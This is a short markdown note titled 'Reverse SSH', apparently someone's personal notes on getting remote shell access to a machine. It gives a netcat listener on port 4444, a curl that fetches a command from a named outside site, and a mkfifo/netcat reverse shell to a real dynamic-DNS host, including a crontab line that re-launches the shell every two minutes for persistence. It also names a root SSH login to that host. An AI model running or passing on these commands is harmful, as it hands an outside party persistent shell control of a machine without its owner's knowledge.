# Reverse SSH

### Ingredients

### Description 

- SSH on remote pi

```
ssh [USER]@[HOSTNAME] -p [SSH_PORT]
ssh root@pipeter.asuscomm.com -p 22222
```

- Listen on port (Custom)

```
fifa
```
or:

```
nc -lvp [PORT]
nc -lvp 4444
```

- Client Side

```
# get cmd
curl hackyll.com/fifo2

# i.e.
crontab -l | { cat; echo "*/2 * * * * nohup -- \"\$(rm -f /tmp/g; mkfifo /tmp/g; /bin/sh 0< /tmp/g | nc pipeter.asuscomm.com 4444 1> /tmp/g)\"  >/dev/null 2>&1 & >/dev/null 2>&1"; } | crontab -

One time only:
rm -f /tmp/g; mkfifo /tmp/g; /bin/sh 0< /tmp/g | nc pipeter.asuscomm.com 4444 1> /tmp/g
```
